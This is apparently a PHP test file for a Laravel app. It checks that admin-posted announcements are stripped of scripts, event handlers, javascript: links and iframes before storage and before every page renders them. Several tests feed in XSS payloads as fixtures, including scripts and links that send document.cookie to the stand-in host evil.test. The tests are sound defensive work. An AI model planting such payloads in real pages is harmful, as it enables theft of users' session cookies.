<?php

use App\Models\Announcement;
use App\Models\User;
use Inertia\Testing\AssertableInertia;
use Spatie\Permission\Models\Role;

beforeEach(function () {
    Role::findOrCreate('admin', 'web');
    Role::findOrCreate('student', 'web');

    $this->admin = User::factory()->admin()->create();
    $this->admin->assignRole('admin');
});

function storedBody(Announcement $announcement): string
{
    return Announcement::findOrFail($announcement->id)->body;
}

test('storing an announcement strips script from the body', function () {
    $this->actingAs($this->admin)
        ->post('/admin/announcements', [
            'title' => 'Enrolment',
            'content' => '<p>Register now</p><script>fetch("https://evil.test?c="+document.cookie)</script>',
        ])
        ->assertSessionHasNoErrors();

    $body = storedBody(Announcement::firstOrFail());

    expect($body)->toContain('Register now')
        ->and($body)->not->toContain('<script')
        ->and($body)->not->toContain('evil.test');
});

test('storing an announcement strips inline event handlers', function () {
    $this->actingAs($this->admin)->post('/admin/announcements', [
        'title' => 'Enrolment',
        'content' => '<img src="x" onerror="alert(document.cookie)">',
    ]);

    expect(storedBody(Announcement::firstOrFail()))
        ->not->toContain('onerror')
        ->not->toContain('alert');
});

test('storing an announcement strips script bearing links', function () {
    $this->actingAs($this->admin)->post('/admin/announcements', [
        'title' => 'Enrolment',
        'content' => '<a href="javascript:fetch(`https://evil.test?c=`+document.cookie)">Click</a>',
    ]);

    expect(storedBody(Announcement::firstOrFail()))->not->toContain('javascript:');
});

test('storing an announcement keeps a disallowed embed out of the body', function () {
    $this->actingAs($this->admin)->post('/admin/announcements', [
        'title' => 'Enrolment',
        'content' => '<iframe src="https://evil.test/steal"></iframe>',
    ]);

    expect(storedBody(Announcement::firstOrFail()))->not->toContain('<iframe');
});

test('updating an announcement strips script from the body', function () {
    $announcement = Announcement::create([
        'title' => 'Original',
        'body' => '<p>Safe</p>',
        'posted_by' => $this->admin->id,
        'published_at' => now(),
    ]);

    $this->actingAs($this->admin)
        ->put("/admin/announcements/{$announcement->id}", [
            'title' => 'Updated',
            'content' => '<p>Safe</p><script>alert(1)</script>',
        ])
        ->assertSessionHasNoErrors();

    $announcement->refresh();

    expect($announcement->title)->toBe('Updated')
        ->and($announcement->body)->toBe('<p>Safe</p>');
});

test('storing an announcement requires a title and a body', function () {
    $this->actingAs($this->admin)
        ->post('/admin/announcements', ['title' => '', 'content' => ''])
        ->assertSessionHasErrors(['title', 'content']);

    expect(Announcement::count())->toBe(0);
});

test('a stored announcement reaches every render path without script', function () {
    $this->actingAs($this->admin)->post('/admin/announcements', [
        'title' => 'Enrolment',
        'content' => '<h1>Registrar</h1><p style="color:#ff9900;text-align:center">Register</p>'
            .'<ul><li>One</li></ul><script>alert(1)</script>',
    ]);

    $expected = Announcement::firstOrFail()->body;

    expect($expected)->toContain('<h1>Registrar</h1>')
        ->and($expected)->toContain('color:#ff9900')
        ->and($expected)->not->toContain('<script');

    // The landing page is the unauthenticated surface, and HomeController
    // redirects signed-in users away from it, so drop the admin session first.
    $this->app['auth']->forgetGuards();

    $student = User::factory()->create();
    $student->assignRole('student');

    $steps = [
        'Welcome' => fn () => $this->get('/'),
        'User/Announcements' => fn () => $this->actingAs($student)->get('/user/announcements'),
        'User/Dashboard' => fn () => $this->actingAs($student)->get('/user/dashboard'),
        'Admin/Announcements' => fn () => $this->actingAs($this->admin)->get('/admin/announcements'),
    ];

    foreach ($steps as $component => $make) {
        $make()->assertInertia(fn (AssertableInertia $page) => $page
            ->component($component)
            ->where('announcements.0.content', $expected)
        );
    }
});
test('guests cannot post announcements', function () {
    $this->post('/admin/announcements', [
        'title' => 'Enrolment',
        'content' => '<script>alert(1)</script>',
    ])->assertRedirect();

    expect(Announcement::count())->toBe(0);
});
